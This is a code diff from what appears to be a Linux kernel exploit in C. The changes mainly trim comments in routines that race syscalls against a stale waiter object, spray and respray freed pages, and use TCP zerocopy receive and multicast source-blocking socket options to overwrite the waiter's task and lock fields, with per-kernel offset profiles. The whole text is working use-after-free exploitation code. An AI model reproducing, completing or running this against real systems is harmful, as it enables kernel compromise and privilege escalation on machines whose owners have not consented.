@@ -11,12 +11,9 @@ extern int pselect_custom_write;
 
 int route_last_step;
 int route_last_errno;
-/* 1 once the route drained its consumer and released every fd it raced;
- * a stuck consumer means the stale page is still live and the caller must
- * not spray onto it again */
+/* 0 leaves the stale page live, so the caller must not spray onto it again */
 int route_last_clean;
 
-/* stop the consumer and wait out its syscall; 0 if it never left inflight */
 static int route_drain_consumer(int max_ms) {
   atomic_store(&punch_consume_go, 0);
   for (int waited = 0; waited < max_ms && atomic_load(&consumer_inflight);
@@ -26,9 +23,7 @@ static int route_drain_consumer(int max_ms) {
   return atomic_load(&consumer_inflight) == 0;
 }
 
-/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
- * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
- * waiter->lock. */
+/* zc[0x28] is waiter->task, zc[0x30] waiter->lock. */
 #define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
 /* caps a route that never wins so a lost run does not spend the app timeout */
 #define TCP_ROUTE_ATTEMPTS 128
@@ -284,15 +279,13 @@ out:
   if (puncher_started) {
     pthread_join(puncher, NULL);
   }
-  /* a consumer stuck in sched_setattr still holds the stale page; report it
-   * instead of letting the caller spray again on top of it */
   route_last_clean = route_drain_consumer(2000);
   if (!route_last_clean) {
     route_last_step = route_ok ? 0 : 47;
     pr_warning("tcp consumer still inflight after route, leaking fds\n");
   }
-  /* fds close regardless: the route fds are hit threads' syscall objects,
-   * unlike the reclaim sockets the caller keeps for respray */
+  /* the route fds are hit threads' syscall objects, so they close even when
+   * the drain timed out. the reclaim sockets stay open for the respray. */
   if (map != MAP_FAILED) {
     munmap(map, TCP_PUNCH_SHMEM_LEN);
   }
@@ -606,6 +599,7 @@ void do_pselect_fake_lock_route(void) {
             attempt, attempts, compact_route, fops_elapsed_ms(&route_t0));
     errno = 0;
     int ret;
+    atomic_store(&pselect_started_ns, route_now_ns());
     if (compact_route) {
       struct timespec ts = {
         .tv_sec = compact_timeout_sec,
@@ -686,10 +680,9 @@ void do_pselect_fake_lock_route(void) {
           calls, success, route_last_step, route_last_errno);
 }
 
-/* Multicast route: setsockopt(MCAST_BLOCK_SOURCE) copies the option buffer
- * to the kernel stack at a fixed depth, so a profile whose window covers the
- * stale waiter stamps it whole, tree_pc included. Profiles opt in with
- * mcast_waiter_off. */
+/* setsockopt(MCAST_BLOCK_SOURCE) copies the option buffer to the kernel stack
+ * at a fixed depth, so a profile whose window reaches the stale waiter stamps
+ * it whole, tree_pc included. Profiles opt in with mcast_waiter_off. */
 void do_kernel5_fake_lock_route(void) {
   size_t stamp_size = active_offsets->mcast_buffer_size;
   size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
